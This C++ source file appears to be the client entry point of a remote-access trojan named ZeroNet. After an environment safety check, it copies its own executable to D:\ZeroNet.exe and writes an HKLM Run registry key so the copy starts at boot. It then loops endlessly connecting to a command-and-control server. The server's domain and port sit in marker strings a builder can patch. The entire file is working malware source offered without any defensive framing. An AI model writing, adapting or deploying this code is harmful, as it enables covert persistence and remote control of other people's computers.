#include "stdafx.h"
#include <winsock2.h>
#include <iostream>
#include "safety.h"
#include "zeroclient.h"

int gOffsetDomain = 10;
char gDomain[100] = "DNSDNSDNS:127.0.0.1 ";
int gOffsetPort = 13;
char gPort[100] = "PORTPORTPORT:18000 ";


// Libraries
#pragma comment(lib, "jpeg/libjpeg.lib")
#pragma comment(lib, "WS2_32")



int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	int IsSafe=isSafety();
	while(!IsSafe)
	{
		WSAData wsaData;
		if (WSAStartup(MAKEWORD(2,1), &wsaData)) {
			std::cout << "Failed to initialize WSA" << std::endl;
			return -1;
		}
        //copy到D盘根目录下
		char sourcefile[MAX_PATH] = { 0 };
		DWORD dwRet=GetModuleFileName(NULL, sourcefile, MAX_PATH);
		HANDLE sourcehandle=CreateFile(sourcefile,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
		if(sourcehandle==INVALID_HANDLE_VALUE)
		{
			CloseHandle(sourcehandle);
			return -1;
		}
		DWORD filesize=GetFileSize(sourcehandle,NULL);
		char *filebuf=new char[filesize+1];
		DWORD readsize;
		if(!ReadFile(sourcehandle,filebuf,filesize,&readsize,NULL))
		{
			delete []filebuf;
			CloseHandle(sourcehandle);
		}
		else
		{
			DWORD writesize;
			HANDLE desthandle=CreateFile("D:\\ZeroNet.exe",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
			WriteFile(desthandle,filebuf,filesize,&writesize,NULL);
			delete []filebuf;
			CloseHandle(sourcehandle);
			CloseHandle(desthandle);
		}
		//添加开机自启注册表
		HKEY hKey;
		LPCTSTR lpRun = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
		RegSetValueEx(hKey, TEXT("ZeroNet"), 0, REG_SZ, (BYTE *)"D:\\ZeroNet.exe", dwRet);  
		RegCloseKey(hKey);
		//连接sever
		ZeroClient client;
		client.hInst = hInstance;
		while (1) {
			char domain[100] = {0};
			char *domainStartPos = (char*)gDomain+gOffsetDomain;
			client.connectTo(domainStartPos, atoi(gPort+gOffsetPort));
			Sleep(1000);
		}

		WSACleanup();
	}
	exit(0);
    return 0;
}
